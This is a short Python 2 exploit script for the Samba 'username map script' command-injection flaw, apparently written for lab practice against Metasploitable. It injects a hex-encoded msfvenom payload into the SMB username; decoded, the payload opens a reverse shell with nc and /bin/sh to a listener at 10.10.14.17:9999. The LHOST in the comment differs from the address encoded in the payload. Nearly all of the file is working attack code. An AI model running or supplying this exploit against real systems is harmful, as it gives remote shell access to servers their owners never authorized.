#!/usr/bin/python

from smb.SMBConnection import SMBConnection
import random, string
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False
import sys


# Just a python version of a very simple Samba exploit. 
# It doesn't have to be pretty because the shellcode is executed
# in the username field. 

# Based off this Metasploit module - https://www.exploit-db.com/exploits/16320/ 

# Configured SMB connection options with info from here:
# https://pythonhosted.org/pysmb/api/smb_SMBConnection.html

# Use the commandline argument as the target: 
if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()


# Shellcode: 
# msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.0.35 LPORT=9999 -f python

buf =  ""
buf += "\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x73"
buf += "\x7a\x68\x70\x63\x6c\x3b\x20\x6e\x63\x20\x31\x30\x2e"
buf += "\x31\x30\x2e\x31\x34\x2e\x31\x37\x20\x39\x39\x39\x39"
buf += "\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x73\x7a\x68\x70\x63"
buf += "\x6c\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e"
buf += "\x2f\x74\x6d\x70\x2f\x73\x7a\x68\x70\x63\x6c\x20\x32"
buf += "\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f"
buf += "\x73\x7a\x68\x70\x63\x6c"


username = "/=`nohup " + buf + "`"
password = ""
conn = SMBConnection(username, password, "SOMEBODYHACKINGYOU" , "METASPLOITABLE", use_ntlm_v2 = False)
assert conn.connect(sys.argv[1], 445)
